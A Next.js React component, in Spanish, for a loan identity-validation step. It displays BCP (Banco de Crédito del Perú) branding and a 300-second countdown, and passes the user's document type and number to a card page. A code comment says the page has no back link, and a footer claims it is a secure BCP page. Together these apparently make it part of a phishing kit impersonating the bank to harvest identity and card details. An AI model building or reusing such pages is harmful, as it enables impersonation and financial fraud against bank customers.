// app/prestamo/datos/DatosClient.tsx
"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

export default function DatosClient({
  amount,
  payDay,
  docType,
  docNumber,
}: {
  amount: string;
  payDay: string;
  docType: string;
  docNumber: string;
}) {
  const router = useRouter();

  // Header: contador 300s
  const [seconds, setSeconds] = useState(300);
  useEffect(() => {
    const t = setInterval(() => setSeconds((s) => Math.max(0, s - 1)), 1000);
    return () => clearInterval(t);
  }, []);

  const goTarjeta = () => {
    const qs = new URLSearchParams({
      amount,
      payDay,
      docType,
      docNumber,
    }).toString();
    router.push(`/prestamo/tarjeta?${qs}`);
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header azul con logo y segundero (sin “Volver”) */}
      <header className="bg-[color:var(--brand)] text-white">
        <div className="container-max h-12 flex items-center justify-between">
          <img src="/bcp-logo.svg" alt="BCP" className="h-5" />
          <div className="flex items-center gap-2 text-sm font-semibold">
            <span>{seconds} segundos</span>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <path d="M9 2h6M12 8v5l3 2" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
              <circle cx="12" cy="14" r="7" stroke="currentColor" strokeWidth="2"/>
            </svg>
          </div>
        </div>
      </header>

      <main className="container-max py-6">
        {/* Tarjeta principal con título y una sola opción */}
        <div className="rounded-[16px] border border-[color:var(--line)] bg-white shadow-[0_12px_28px_rgba(0,0,0,.08)] p-5 max-w-[380px]">
          <h1 className="text-2xl font-bold text-[color:var(--brand)] mb-1">
            ¿Cómo deseas validar tu identidad?
          </h1>

          {/* Opción: Tarjeta */}
          <div className="mt-4 rounded-[16px] border border-[color:var(--line)] bg-white shadow-sm p-4">
            <h2 className="text-[22px] leading-6 font-bold text-[color:var(--brand)]">
              Tarjeta
            </h2>
            <p className="text-[15px] text-[#5A6B84] mt-1">
              La <b>autenticación con tarjeta</b> que ya conoces.
            </p>

            <button
              type="button"
              onClick={goTarjeta}
              className="mt-4 inline-flex items-center gap-2 text-[#FF7A00] font-semibold"
            >
              Valida tu identidad
              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden>
                <path d="M10 6l6 6-6 6" />
              </svg>
            </button>
          </div>
        </div>

        {/* Footer legal */}
        <div className="max-w-[380px] mx-auto text-center text-[12px] text-[#8AA0B6] mt-6 space-y-1">
          <div className="flex items-center justify-center gap-2">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
              <path d="M12 1l9 5v12l-9 5-9-5V6l9-5z" stroke="currentColor" strokeWidth="1.4"/>
              <path d="M8 12h8M12 8v8" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round"/>
            </svg>
            <span>
              Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate con nosotros al (01) 311-9898 o a través de nuestros medios digitales.
            </span>
          </div>
          <div className="pt-3 border-t border-[#E5EDF6]">
            Banco de Crédito del Perú S.A<br/>
            RUC: 20100047218<br/>
            © 2025 VIABCP.com<br/>
            Todos los derechos reservados
          </div>
        </div>
      </main>
    </div>
  );
}
